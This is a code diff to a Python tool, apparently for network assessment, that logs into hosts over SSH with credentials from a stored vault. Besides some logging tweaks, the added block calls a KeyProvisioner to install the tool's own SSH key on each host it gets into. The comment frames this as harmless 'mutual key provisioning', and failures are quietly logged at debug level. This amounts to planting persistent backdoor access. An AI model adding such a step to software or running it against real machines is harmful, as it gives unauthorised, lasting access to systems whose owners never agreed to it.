@@ -104,13 +104,25 @@ def probe_ssh(ip: str, cfg: "Config", vault: "CredVault") -> str:
 
             _, stdout, _ = client.exec_command("uname -a")
             banner = stdout.read(256).decode(errors="replace").strip()
+
+            # Mutual SSH key provisioning (idempotent — safe to re-run)
+            alias = ""
+            try:
+                from keyprovisioner import KeyProvisioner
+                prov = KeyProvisioner().provision(ip, c["user"], client)
+                if prov.get("our_key_installed"):
+                    alias = prov["alias"]
+            except Exception as exc:
+                log.debug("Key provisioning skipped for %s: %s", ip, exc)
+
             client.close()
-            return f"SUCCESS user={c['user']} banner={banner!r}"
+            suffix = f" alias={alias}" if alias else ""
+            return f"SUCCESS user={c['user']} banner={banner!r}{suffix}"
 
         except paramiko.AuthenticationException:
-            log.debug("SSH auth failed: %s@%s", c.get("user"), ip)
+            log.info("  [%s] SSH auth failed: user=%s", ip, c.get("user"))
         except Exception as exc:
-            log.debug("SSH error %s@%s: %s", c.get("user"), ip, exc)
+            log.info("  [%s] SSH error: user=%s  %s", ip, c.get("user"), exc)
 
     return "auth failed for all stored credentials"
 
@@ -218,7 +230,7 @@ class Accessor:
 
     def assess(self, ip: str) -> dict:
         """Run all configured probes against ip.  Returns results dict."""
-        log.info("Assessing %s …", ip)
+        log.info("Assessing %s — probes: %s", ip, ", ".join(self.cfg.access_probes))
         results: dict = {}
         open_ports: dict[int, str] = {}
 
